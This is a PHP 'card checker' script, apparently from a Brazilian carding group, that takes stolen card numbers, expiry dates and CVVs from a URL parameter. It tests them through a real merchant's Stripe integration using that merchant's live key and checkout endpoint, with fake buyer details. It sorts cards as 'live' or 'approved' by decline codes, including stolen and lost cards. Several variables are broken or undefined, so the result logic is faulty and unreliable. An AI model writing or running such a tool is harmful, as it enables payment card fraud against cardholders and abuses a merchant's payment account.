<?php
error_reporting(0);
set_time_limit(0);
date_default_timezone_set('America/Sao_Paulo');

$lista = $_GET['lista'] ?? '';
$separar = explode("|", $lista);
$cc = trim(str_replace(' ', '', $separar[0] ?? ''));
$mes = trim($separar[1] ?? '');
$ano = trim($separar[2] ?? '');
$cvv = trim($separar[3] ?? '');

if (strlen($ano) == 4) $ano = substr($ano, 2, 2);
if (strlen($mes) == 1) $mes = '0' . $mes;

if (empty($cc) || empty($mes) || empty($ano) || empty($cvv)) {
    die("❌ REPROVADA | $lista | Cartão Inválido");
}

$inicio = microtime(true);

function detectarBandeira($cc) {
    $primeiro = substr($cc, 0, 1);
    if ($primeiro == '4') return 'Visa';
    if ($primeiro == '5') return 'Mastercard';
    if ($primeiro == '3') return 'Amex';
    if ($primeiro == '6') return 'Discover';
    return 'Visa';
}

function gerarEmail() {
    $dominios = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'protonmail.com'];
    $nome = 'user' . rand(100000, 999999);
    return $nome . '@' . $dominios[array_rand($dominios)];
}

function gerarSessionId() {
    return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0, 0xffff), mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff));
}

$bandeira = detectarBandeira($cc);
$email = gerarEmail();
$session_id = gerarSessionId();
$useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36";

$stripe_post = 'type=card&card[number]=' . $cc . 
               '&card[cvc]=' . $cvv . 
               '&card[exp_month]=' . $mes . 
               '&card[exp_year]=20' . $ano . 
               '&payment_user_agent=stripe.js%2F65a4258fcc%3B+stripe-js-v3%2F65a4258fcc%3B+card-element' .
               '&referrer=https%3A%2F%2Fwww.fatfreecartpro.com' .
               '&client_attribution_metadata[client_session_id]=' . $session_id .
               '&client_attribution_metadata[merchant_integration_source]=elements' .
               '&client_attribution_metadata[merchant_integration_subtype]=card-element' .
               '&client_attribution_metadata[merchant_integration_version]=2017' .
               '&key=pk_live_UUFYTQ63roIxScFWo9jLfco5' .
               '&_stripe_account=acct_1NMRCgJG5BoI6HHT';

$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
    CURLOPT_POST => true,
    CURLOPT_HTTPHEADER => [
        'Host: api.stripe.com',
        'User-Agent: ' . $useragent,
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://js.stripe.com',
        'Referer: https://js.stripe.com/',
    ],
    CURLOPT_POSTFIELDS => $stripe_post,
]);
$stripe_response = curl_exec($ch);
curl_close($ch);

$stripe_json = json_decode($stripe_response, true);


if (isset($stripe_json['error'])) {
    $erro = $stripe_json['error']['message'] ?? $stripe_json['error']['code'] ?? 'Erro no Stripe';
    $erro_lower = strtolower($erro);
    
    if (strpos($erro_lower, 'cvv') !== false || strpos($erro_lower, 'security') !== false) {
        die("✅ ZERO DOLLAR (LIVE) | $cc|$mes|$ano|$cvv | $bandeira | CVV INVÁLIDO | @cybersecofc | -");
    }
    
    if (strpos($erro_lower, 'expired') !== false) {
        die("❌ REPROVADA | $cc|$mes|$ano|$cvv | $bandeira | CARTAO EXPIRADO | @cybersecofc | -");
    }
    
    if (strpos($erro_lower, 'invalid') !== false) {
        die("❌ REPROVADA | $cc|$mes|$ano|$cvv | $bandeira | CARTAO INVALIDO | @cybersecofc | -");
    }
    
    die("❌ REPROVADA | $cc|$mes|$ano|$cvv | $bandeira | $erro | @cybersecofc | -");
}

$payment_method_id = $stripe_json['id'] ?? '';

if (empty($payment_method_id)) {
    die("❌ REPROVADA | $cc|$mes|$ano|$cvv | $bandeira | Falha ao criar payment method | @cybersecofc | -");
}

$post_data = json_encode([
    'payment_method_id' => $payment_method_id,
    'cart_id' => '219279797',
    'cart_md5' => 'ff89e9734155349fa00b81853adacc49',
    'first_name' => 'cyber',
    'last_name' => 'sexo',
    'email' => $email
]);

$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => 'https://www.fatfreecartpro.com/ecom/ccv3/assets-php/Stripe/stripeValidate.php',
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
    CURLOPT_POST => true,
    CURLOPT_HTTPHEADER => [
        'Host: www.fatfreecartpro.com',
        'User-Agent: ' . $useragent,
        'Content-Type: application/json',
        'Accept: application/json',
        'Origin: https://www.fatfreecartpro.com',
        'Referer: https://www.fatfreecartpro.com/',
    ],
    CURLOPT_POSTFIELDS => $post_data,
]);
echo$response2 = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

$$tempo = number_format(microtime(true) - $inicio, 2);
$data2 = json_decode($cyber, true);

if ($httpcode2 == 200 && isset($data2['status']) && $data2['status'] == 'succeeded') {
    die("✅ APROVADO ~> $cc|$mes|$ano|$cvv ~> $bandeira ~> PAGAMENTO CONFIRMADO! ~> @cybersecofc ~> {$tempo}s");
}


if (strpos($cyber, 'incorrect_cvc') !== false || strpos($cyber, 'invalid_cvc') !== false || 
    strpos($cyber, 'security_code') !== false) {
    die("✅ APROVADO ~> $cc|$mes|$ano|$cvv ~> $bandeira ~> LIVE - CVV INCORRETO ~> @cybersecofc ~> {$tempo}s");
}

if (strpos($cyber, 'insufficient_funds') !== false || strpos($cyber, 'insufficient') !== false) {
    die("✅ APROVADO ~> $cc|$mes|$ano|$cvv ~> $bandeira ~> LIVE - SALDO INSUFICIENTE ~> @cybersecofc ~> {$tempo}s");
}


if (strpos($cyber, 'stolen_card') !== false || strpos($cyber, 'lost_card') !== false) {
    die("✅ APROVADO ~> $cc|$mes|$ano|$cvv ~> $bandeira ~> LIVE - CARTAO BLOQUEADO ~> @cybersecofc ~> {$tempo}s");
}

if (strpos($cyber, 'do_not_honor') !== false) {
    die("✅ APROVADO ~> $cc|$mes|$ano|$cvv ~> $bandeira ~> LIVE - DO NOT HONOR ~> @cybersecofc ~> {$tempo}s");
}

if (strpos($cyber, 'expired_card') !== false || strpos($cyber, 'expired') !== false) {
    die("❌ REPROVADO ~> $cc|$mes|$ano|$cvv ~> $bandeira ~> CARTAO EXPIRADO ~> @cybersecofc ~> {$tempo}s");
}


if (strpos($cyber, 'invalid_number') !== false || strpos($cyber, 'incorrect_number') !== false) {
    die("❌ REPROVADO ~> $cc|$mes|$ano|$cvv ~> $bandeira ~> CARTAO INVALIDO ~> @cybersecofc ~> {$tempo}s");
}

$erroStripe = $data2['error']['message'] ?? ($data2['error']['decline_code'] ?? 'CARTÃO RECUSADO');
die("❌ REPROVADO ~> $cc|$mes|$ano|$cvv ~> $bandeira ~> $erroStripe ~> @cybersecofc ~> {$tempo}s");
?>
